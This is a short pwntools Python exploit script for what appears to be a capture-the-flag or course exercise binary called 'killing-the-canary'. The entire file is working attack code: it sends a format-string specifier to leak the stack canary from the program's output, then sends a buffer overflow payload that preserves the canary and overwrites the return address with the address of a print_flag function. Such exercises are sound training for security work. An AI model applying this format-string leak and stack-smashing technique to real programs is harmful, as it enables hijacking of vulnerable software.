#!/usr/bin/env python3
import re
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("./killing-the-canary")

r = process([exe.path])
#gdb.attach(r)

r.recvuntil(b"What's your name? ")
r.sendline(b"%19$lu") #Add your code here

val = r.recvuntil(b"What's your message? ")
# log.info(val)
#canary = int(re.match(b"Hello, ([0-9]+)\n!.*", val).groups()[0])
#canary = int(re.search(b"Hello, (0x[0-9a-fA-F]+)!", val))
canary = int(re.match(b"Hello, ([0-9]+)\n!.*", val).groups()[0])
#log.info(f"Canary: {canary:x}")

win = exe.symbols['print_flag']
# log.info(hex(win))

payload = b'A' * 72 + p64(canary) + b'A'*8 + p64(win)

r.sendline(payload)

r.recvline()
r.interactive()